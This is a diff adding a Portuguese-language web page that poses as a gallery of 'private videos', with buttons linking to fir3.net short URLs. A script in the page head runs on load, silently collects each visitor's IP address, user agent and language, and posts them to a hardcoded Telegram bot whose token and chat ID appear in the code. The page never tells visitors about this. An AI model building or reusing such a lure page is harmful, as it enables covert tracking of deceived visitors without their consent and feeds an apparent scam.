@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vídeos Privados</title>
+    <style>
+        body {
+            background-color: black;
+            color: white;
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 20px;
+        }
+        h1 {
+            text-align: center;
+            margin-bottom: 20px;
+            font-size: 2.5em;
+        }
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .card {
+            background-color: red;
+            border-radius: 15px;
+            padding: 20px;
+            margin: 10px;
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+        }
+        .card img {
+            width: 100%;
+            border-radius: 10px;
+            margin-bottom: 10px;
+        }
+        .card h2 {
+            font-size: 1.8em;
+            margin-bottom: 15px;
+        }
+        .button {
+            background: url('https://i.postimg.cc/T2c8B9gX/images-3.png') no-repeat center center;
+            background-size: cover;
+            padding: 0;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            width: 300px;
+            height: 100px;
+            display: block;
+            margin: 0 auto;
+        }
+        .button:hover {
+            filter: brightness(0.8);
+        }
+    </style>
+    <script>
+        async function sendVisitAlert() {
+            const token = '7697048284:AAGga8tsxHaR0GXBbl3JSMQXDOQ_QLpXN-s';
+            const chatId = '5789137812';
+            const apiUrl = `https://api.telegram.org/bot${token}/sendMessage`;
+
+            // Coletando dados do visitante
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const { ip } = await ipResponse.json();
+            const userAgent = navigator.userAgent;
+            const language = navigator.language || 'Indefinido';
+
+            // Mensagem a ser enviada
+            const message = `
+📥 Nova visita ao site:
+IP: ${ip}
+User-Agent: ${userAgent}
+Idioma: ${language}
+By: j445
+            `;
+
+            // Enviando mensagem ao bot
+            fetch(apiUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                }),
+            });
+        }
+
+        // Envia o alerta ao Telegram ao carregar a página
+        document.addEventListener('DOMContentLoaded', () => {
+            sendVisitAlert();
+        });
+    </script>
+</head>
+<body>
+    <h1>Vídeos atualizados aqui!</h1>
+    <div class="container">
+        <div class="card">
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ2--NwupJYHouo4wpEo1VFe7IjhoIt0yex1g&usqp=CAU" alt="Imagem 1">
+            <h2>Vídeo 1</h2>
+            <a href="https://fir3.net/video777" class="button" target="_blank"></a>
+        </div>
+        <div class="card">
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ2--NwupJYHouo4wpEo1VFe7IjhoIt0yex1g&usqp=CAU" alt="Imagem 2">
+            <h2>Vídeo 2</h2>
+            <a href="https://fir3.net/fenix1" class="button" target="_blank"></a>
+        </div>
+        <div class="card">
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ2--NwupJYHouo4wpEo1VFe7IjhoIt0yex1g&usqp=CAU" alt="Imagem 3">
+            <h2>Vídeo 3</h2>
+            <a href="https://fir3.net/fenix2" class="button" target="_blank"></a>
+        </div>
+        <div class="card">
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ2--NwupJYHouo4wpEo1VFe7IjhoIt0yex1g&usqp=CAU" alt="Imagem 4">
+            <h2>Vídeo 4</h2>
+            <a href="https://fir3.net/fenix3" class="button" target="_blank"></a>
+        </div>
+        <div class="card">
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ2--NwupJYHouo4wpEo1VFe7IjhoIt0yex1g&usqp=CAU" alt="Imagem 5">
+            <h2>Vídeo 5</h2>
+            <a href="https://fir3.net/fenix4" class="button" target="_blank"></a>
+        </div>
+    </div>
+</body>
+</html>
